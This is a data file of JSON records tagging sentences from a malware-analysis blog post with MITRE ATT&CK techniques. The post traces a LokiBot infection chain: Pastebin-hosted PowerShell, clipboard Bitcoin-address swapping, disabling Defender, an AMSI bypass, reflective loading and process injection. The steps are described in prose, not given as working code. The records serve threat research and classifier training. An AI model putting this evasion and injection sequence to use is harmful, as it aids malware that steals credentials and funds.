{"mention": "the script executed", "context_left": "The execution of each of the 4 scripts is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“. Since", "context_right": "by **id1** is the most complex, we will leave it for the end of the post and we will focus first on the other 3 in order of complexity. **id3** does not run anything, probably the author who is using this dropper did not need it and left it free, pointing to the next script hosted in Pastebin:", "_context_left": "Since ", "_context_right": " by **id1** is the most complex, we will leave it for the end of the post and we will focus first on the other 3 in order of complexity.", "sentence_left": "The execution of each of the 4 scripts is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“.", "sentence_right": "**id3** does not run anything, probably the author who is using this dropper did not need it and left it free, pointing to the next script hosted in Pastebin:", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "consists of a small script in powershell", "context_left": "| <script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>self.close</script> | **id2**", "context_right": ", which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard. In case that the copied string is a Bitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user deposit money into the actor’s account:", "_context_left": "**id2** ", "_context_right": ", which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard.", "sentence_left": "| <script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>self.close</script> |", "sentence_right": "In case that the copied string is a Bitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user deposit money into the actor’s account:", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "runs on every reboot", "context_left": "| <script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>self.close</script> | **id2** consists of a small script in powershell, which", "context_right": "and stays in a loop checking everything copied to the Windows clipboard. In case that the copied string is a Bitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user deposit money into the actor’s account:", "_context_left": "**id2** consists of a small script in powershell, which ", "_context_right": " and stays in a loop checking everything copied to the Windows clipboard.", "sentence_left": "| <script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>self.close</script> |", "sentence_right": "In case that the copied string is a Bitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user deposit money into the actor’s account:", "label": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel. Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.", "label_id": 330, "label_title": "Boot or Logon Autostart Execution", "label_link": "https://attack.mitre.org/techniques/T1547", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "everything copied to the Windows clipboard.", "context_left": "| <script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>self.close</script> | **id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking", "context_right": "In case that the copied string is a Bitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user deposit money into the actor’s account:", "_context_left": "**id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking ", "_context_right": "", "sentence_left": "| <script language=”&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;”>self.close</script> |", "sentence_right": "In case that the copied string is a Bitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user deposit money into the actor’s account:", "label": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. In Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)", "label_id": 346, "label_title": "Clipboard Data", "label_link": "https://attack.mitre.org/techniques/T1115", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "case that the copied string is a Bitcoin address, it replaces it with the attacker’s Bitcoin address, in order to make the user deposit money into the actor’s account", "context_left": "**id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard. In", "context_right": ": In this case, although the script is capable of storing up to four bitcoin addresses, the script only has one repeated four times (19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W), from which has been possible to identify different sources that did not have much activity:", "_context_left": "In ", "_context_right": ":", "sentence_left": "**id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard.", "sentence_right": "In this case, although the script is capable of storing up to four bitcoin addresses, the script only has one repeated four times (19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W), from which has been possible to identify different sources that did not have much activity:", "label": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. In Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)", "label_id": 346, "label_title": "Clipboard Data", "label_link": "https://attack.mitre.org/techniques/T1115", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "base64 encoded file", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png) **Defid**, on the other hand, points to another script, which downloads from Pastebin a", "context_right": ", which has been inverted and where the “0” characters have been replaced by the “.character in order to make its analysis more difficult: ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "_context_left": "**Defid**, on the other hand, points to another script, which downloads from Pastebin a ", "_context_right": ", which has been inverted and where the “0” characters have been replaced by the “.character in order to make its analysis more difficult:", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png)", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "downloads from Pastebin a base64 encoded file", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png) **Defid**, on the other hand, points to another script, which", "context_right": ", which has been inverted and where the “0” characters have been replaced by the “.character in order to make its analysis more difficult: ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "_context_left": "**Defid**, on the other hand, points to another script, which ", "_context_right": ", which has been inverted and where the “0” characters have been replaced by the “.character in order to make its analysis more difficult:", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png)", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "which has been inverted and where the “0” characters have been replaced by the “.character in order to make its analysis more difficult", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png) **Defid**, on the other hand, points to another script, which downloads from Pastebin a base64 encoded file,", "context_right": ": ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "_context_left": "**Defid**, on the other hand, points to another script, which downloads from Pastebin a base64 encoded file, ", "_context_right": ":", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png)", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "label": "The adversary is trying to avoid being detected. Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.", "label_id": 578, "label_title": "Defense Evasion", "label_link": "https://attack.mitre.org/tactics/TA0005", "entity_class": "CI", "entity_type": "TACTIC", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "After sorting and decoding", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "context_right": "it, we obtain a small executable developed in .Net and without obfuscation whose only purpose is to drop in the system a .vbs file that disables a large number of system security policies, including those of Windows Defender and MS Office. * ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png)", "_context_left": "", "_context_right": " it, we obtain a small executable developed in .Net and without obfuscation whose only purpose is to drop in the system a .vbs file that disables a large number of system security policies, including those of Windows Defender and MS Office.", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "sentence_right": "* ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png)", "label": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "label_id": 514, "label_title": "Deobfuscate/Decode Files or Information", "label_link": "https://attack.mitre.org/techniques/T1140", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "purpose is to drop in the system a .vbs file that disables a large number of system security policies, including those of Windows Defender and MS Office", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png) After sorting and decoding it, we obtain a small executable developed in .Net and without obfuscation whose only", "context_right": ". * ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png)", "_context_left": "After sorting and decoding it, we obtain a small executable developed in .Net and without obfuscation whose only ", "_context_right": ".", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)", "sentence_right": "* ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png)", "label": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.", "label_id": 147, "label_title": "Impair Defenses", "label_link": "https://attack.mitre.org/techniques/T1562", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the “**Defid**” executable.", "context_left": "This script, first of all leaves some kind words for the analyst who is reviewing the execution flow of this threat, and informs us that he would like to change it’s job :). In terms of capabilities,", "context_right": "Once downloaded and deobfuscated, it loads them with “[System.Reflection.Assembly]::Load(XXX)” which allows him to directly call functions within these binaries from PowerShell.", "_context_left": "In terms of capabilities, ", "_context_right": "", "sentence_left": "This script, first of all leaves some kind words for the analyst who is reviewing the execution flow of this threat, and informs us that he would like to change it’s job :).", "sentence_right": "Once downloaded and deobfuscated, it loads them with “[System.Reflection.Assembly]::Load(XXX)” which allows him to directly call functions within these binaries from PowerShell.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "directly call functions within these binaries from PowerShell.", "context_left": "In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the “**Defid**” executable. Once downloaded and deobfuscated, it loads them with “[System.Reflection.Assembly]::Load(XXX)” which allows him to", "context_right": "The call to the first binary loaded, is as follows", "_context_left": "Once downloaded and deobfuscated, it loads them with “[System.Reflection.Assembly]::Load(XXX)” which allows him to ", "_context_right": "", "sentence_left": "In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the “**Defid**” executable.", "sentence_right": "The call to the first binary loaded, is as follows", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "it loads them with “[System.Reflection.Assembly]::Load(XXX", "context_left": "In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the “**Defid**” executable. Once downloaded and deobfuscated,", "context_right": ")” which allows him to directly call functions within these binaries from PowerShell. The call to the first binary loaded, is as follows", "_context_left": "Once downloaded and deobfuscated, ", "_context_right": ")” which allows him to directly call functions within these binaries from PowerShell.", "sentence_left": "In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the “**Defid**” executable.", "sentence_right": "The call to the first binary loaded, is as follows", "label": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)", "label_id": 501, "label_title": "Reflective Code Loading", "label_link": "https://attack.mitre.org/techniques/T1620", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "it downloads **a third executable** from Pastebin", "context_left": "It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique “https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”. After this,", "context_right": ", decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable. This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "_context_left": "After this, ", "_context_right": ", decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable.", "sentence_left": "It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique “https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”.", "sentence_right": "This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "decodes it", "context_left": "It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique “https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”. After this, it downloads **a third executable** from Pastebin,", "context_right": "and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable. This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "_context_left": "After this, it downloads **a third executable** from Pastebin, ", "_context_right": " and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable.", "sentence_left": "It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique “https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”.", "sentence_right": "This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "label": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)", "label_id": 514, "label_title": "Deobfuscate/Decode Files or Information", "label_link": "https://attack.mitre.org/techniques/T1140", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "and loads the second executable,", "context_left": "It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique “https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”. After this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2", "context_right": "also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable. This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "_context_left": "After this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2 ", "_context_right": " also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable.", "sentence_left": "It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique “https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell”.", "sentence_right": "This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "is used to inject in a **non** .Net executable inside another process that is not", "context_left": "After this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable. This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL,", "context_right": ".Net either. That is, it creates a legitimate notepad process, and injects into it the third binary it has downloaded.", "_context_left": "This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, ", "_context_right": " .Net either.", "sentence_left": "After this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function “Chris()” passing as parameters the string “notepad.exe” and the variable that contains the third executable.", "sentence_right": "That is, it creates a legitimate notepad process, and injects into it the third binary it has downloaded.", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "it creates a legitimate notepad process, and injects into it the third binary it has downloaded", "context_left": "This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either. That is,", "context_right": ". This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.", "_context_left": "That is, ", "_context_right": ".", "sentence_left": "This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.", "sentence_right": "This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.", "label": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "label_id": 318, "label_title": "Process Injection", "label_link": "https://attack.mitre.org/techniques/T1055", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "LokiBot", "context_left": "That is, it creates a legitimate notepad process, and injects into it the third binary it has downloaded. This last binary, consists of a sample of the Bot/Stealer", "context_right": ", practically unpacked, which at this point, is in a system without most of its protection measures. It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "_context_left": "This last binary, consists of a sample of the Bot/Stealer ", "_context_right": ", practically unpacked, which at this point, is in a system without most of its protection measures.", "sentence_left": "That is, it creates a legitimate notepad process, and injects into it the third binary it has downloaded.", "sentence_right": "It is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.", "label": "[Lokibot](https://attack.mitre.org/software/S0447) is a widely distributed information stealer that was first reported in 2015. It is designed to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials. [Lokibot](https://attack.mitre.org/software/S0447) can also create a backdoor into infected systems to allow an attacker to install additional payloads.(Citation: Infoblox Lokibot January 2019)(Citation: Morphisec Lokibot April 2020)(Citation: CISA Lokibot September 2020)", "label_id": 984, "label_title": "Lokibot", "label_link": "https://attack.mitre.org/software/S0447", "entity_class": "CE", "entity_type": 